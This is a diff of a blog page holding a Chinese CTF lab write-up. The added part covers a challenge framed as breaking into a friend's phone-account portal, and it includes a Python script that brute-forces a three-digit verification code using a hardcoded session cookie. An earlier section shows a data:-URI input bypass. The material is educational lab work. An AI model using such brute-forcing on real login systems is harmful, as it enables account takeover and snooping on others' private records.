@@ -88,7 +88,7 @@
 <meta property="og:description" content="CTF基础刷题脚本篇">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http://yoursite.com/2019/09/19/网络安全实验室-脚本关-wp/example.jpg">
-<meta property="og:updated_time" content="2019-09-23T05:05:07.029Z">
+<meta property="og:updated_time" content="2019-09-24T05:52:59.720Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="网络安全实验室 脚本关 wp">
 <meta name="twitter:description" content="CTF基础刷题脚本篇">
@@ -355,8 +355,15 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@file_exists ($_GET[<span class="string">'^_^'</span>])) $smile = <span class="number">0</span>;  </span><br><span class="line"> $smile = @file_get_contents ($_GET[<span class="string">'^_^'</span>]); </span><br><span class="line"><span class="keyword">if</span> ($smile === <span class="string">"(●'◡'●)"</span>)</span><br></pre></td></tr></table></figure>
 
 <p>第一句代码告诉我们文件名为’^_^’所对应值的文件在服务器中不存在，可是第二句又要求我们把’^_^’所对应值的文件内容转换为字符串，由此可见该文件通过url传递。第三句可推理出文件中的内容为(●’◡’●)<br>综上，答案为<a href="http://lab1.xseclab.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?^%5f^=data:,(●&#39;◡&#39;●)" target="_blank" rel="noopener">http://lab1.xseclab.com/base13_ead1b12e47ec7cc5390303831b779d47/index.php?^%5f^=data:,(●&#39;◡&#39;●)</a>  </p>
+<h1 id="10-基情燃烧的岁月"><a href="#10-基情燃烧的岁月" class="headerlink" title="10.基情燃烧的岁月"></a>10.基情燃烧的岁月</h1><p>Tips:你是一名黑客，你怀疑你的“（男/女）闺蜜”的出轨了，你要登陆TA手机的网上营业厅查看详单，一探究竟！ 闺蜜手机号码:13388886666</p>
+<blockquote>
+<p><a href="http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/" target="_blank" rel="noopener">http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/</a></p>
+</blockquote>
 </li>
 </ol>
+<p>跟第五题一样的思路，直接爆破即可，但是第一次爆破并不会显示最终的key，只会显示真正需要爆破的号码，然后我们对新号码再重新爆破一次即可。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">'http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php'</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=5b5febd23abb7a18f1275fc625e7b327'</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>, <span class="number">1000</span>):</span><br><span class="line">    data = &#123;<span class="string">'username'</span>: <span class="string">'13399999999'</span>, <span class="string">'vcode'</span>: str(i)&#125;</span><br><span class="line">    ans = requests.post(</span><br><span class="line">        url, data=data, headers=headers).content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">if</span> ans != <span class="string">'vcode or username error'</span>:</span><br><span class="line">        print(ans)</span><br><span class="line">print(<span class="string">'over'</span>)</span><br></pre></td></tr></table></figure>
+
 
       
     </div>
@@ -476,7 +483,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -522,7 +529,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2-快速口算"><span class="nav-number">1.</span> <span class="nav-text">2.快速口算</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-怎么就是不弹出key呢？"><span class="nav-number">2.</span> <span class="nav-text">4.怎么就是不弹出key呢？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-逗比验证码第一期"><span class="nav-number">3.</span> <span class="nav-text">5.逗比验证码第一期</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-逗比验证码第二期"><span class="nav-number">4.</span> <span class="nav-text">6.逗比验证码第二期</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-微笑一下就能过了"><span class="nav-number">5.</span> <span class="nav-text">8.微笑一下就能过了</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2-快速口算"><span class="nav-number">1.</span> <span class="nav-text">2.快速口算</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-怎么就是不弹出key呢？"><span class="nav-number">2.</span> <span class="nav-text">4.怎么就是不弹出key呢？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-逗比验证码第一期"><span class="nav-number">3.</span> <span class="nav-text">5.逗比验证码第一期</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#6-逗比验证码第二期"><span class="nav-number">4.</span> <span class="nav-text">6.逗比验证码第二期</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#8-微笑一下就能过了"><span class="nav-number">5.</span> <span class="nav-text">8.微笑一下就能过了</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#10-基情燃烧的岁月"><span class="nav-number">6.</span> <span class="nav-text">10.基情燃烧的岁月</span></a></li></ol></div>
             
 
           </div>
